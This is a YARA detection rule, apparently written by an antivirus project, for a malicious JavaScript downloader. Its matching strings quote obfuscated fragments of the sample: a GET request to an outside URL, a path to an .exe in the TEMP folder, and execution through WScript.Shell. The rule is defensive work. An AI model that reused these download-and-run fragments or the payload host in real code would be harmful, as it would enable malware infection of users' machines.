rule sig_20160328_0bf3cb5ba01f3d2aa843e978d40a0fde {
  meta:
    description = "datamaliciousorder - file 20160328_0bf3cb5ba01f3d2aa843e978d40a0fde.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "539e6eb72e0c95361633d8d1636c87a5f96d21689ddc6efdcb73d81a8371155f"

  strings:
    $s1  = "function Opzbzmd() {return Nwsixn[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"f9BaJbx61SFGho2F.exe\";};" fullword ascii
    $s2  = "do {WScript[Etbwfpe](Alsyp() * 11)} while (Extjmp[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "function Hxcivvqvlr(Qoqxr, Bjqgwus){return Qoqxr - Bjqgwus;};" fullword ascii
    $s4  = "var Nwsixn = function Trjdwtsuln() {return WScript[Xtuwb](\"WScript.Shell\");}();" fullword ascii
    $s5  = "var Ofspyjgk = new this[\"Date\"]();" fullword ascii
    $s6  = "Extjmp[Vmgrmhnlbp](\"GET\", \"http://lovelustandliving.ca/pow2lk\", false);" fullword ascii
    $s7  = "function Kmvioape(Hxcohauzi){Nwsixn[\"Run\"](Hxcohauzi, Ttjvkl, Ttjvkl);};" fullword ascii
    $s8  = "function Upxof() {return ((Lulqyksk == true) && (Lulqyksk == Llfetpgr)) ? 1 : Ttjvkl;};" fullword ascii
    $s9  = "Lulqyksk = true; " fullword ascii
    $s10 = "function Hmrue()" fullword ascii
    $s11 = "return Hxcivvqvlr(Vymig, Ajjzyag);" fullword ascii
    $s12 = "var Lulqyksk = false;" fullword ascii
    $s13 = "var Llfetpgr = false;" fullword ascii
    $s14 = " while (Outwzquktt){" fullword ascii
    $s15 = "function Oezqgncmp(Ccjnu) {var Urmkasiu = (1, 2, 3, 4, 5, Ccjnu); return Urmkasiu;};" fullword ascii
    $s16 = "function Fjgid(){return Xtuwb;};" fullword ascii
    $s17 = "Llfetpgr = true; " fullword ascii
    $s18 = "function Alsyp(){return 22;};" fullword ascii
    $s19 = "function Pqzqwp(){return Tgpuoyba;};" fullword ascii
    $s20 = "var Azgjwb = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}